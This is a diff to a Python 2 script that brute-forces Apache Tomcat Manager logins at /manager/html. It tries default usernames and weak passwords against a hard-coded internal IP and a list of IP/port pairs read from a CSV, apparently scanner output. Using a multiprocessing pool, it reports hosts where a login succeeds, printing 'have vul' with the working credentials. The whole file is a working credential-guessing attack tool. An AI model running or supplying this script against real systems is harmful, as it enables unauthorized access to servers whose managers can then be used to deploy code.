@@ -7,15 +7,17 @@ import sys
 from multiprocessing import Pool
 import re
 
-def brute_force(target):
+def brute_force(ip_port):
     unames = ['tomcat', 'admin']
     pwds = ['tomcat', 'tomcat123', '123456', '12345']
-    url = target + '/manager/html'
-
+    url = 'http://' + ip_port[0] + ':' + ip_port[1] + '/manager/html'
+    #print url,
     for uname in unames:
         for pwd in pwds:
             try:
+
                 response = req.get(url, auth=(uname, pwd), timeout=5)
+                print url, uname, pwd, response.status_code
             except Exception as e:
                 print url, e
                 return
@@ -23,19 +25,22 @@ def brute_force(target):
             if response.status_code == 200:
                 s = re.findall(r".*Tomcat.*", response.content)
                 if s:
-                    print url, '@', uname, pwd
+                    print url, 'have vul', uname, pwd
 
 
 if __name__ == '__main__':
 
     urls = []
-    urls.append('http://10.223.2.60:9090')
+    urls.append(['10.223.2.60','9090'])
+
     for line in open(sys.argv[1]):
-        line = line.strip()
-        urls.append(line)
+        line = line.strip('\n')
+        if not line.split(',')[0] == "saddr":
+            ip = line.split(',')[0]
+            urls.append([ip, line.split(',')[1]])
 
     #print urls
-    pool = Pool(20)
+    pool = Pool(10)
     pool.map(brute_force, urls)
     pool.close()
     pool.join()
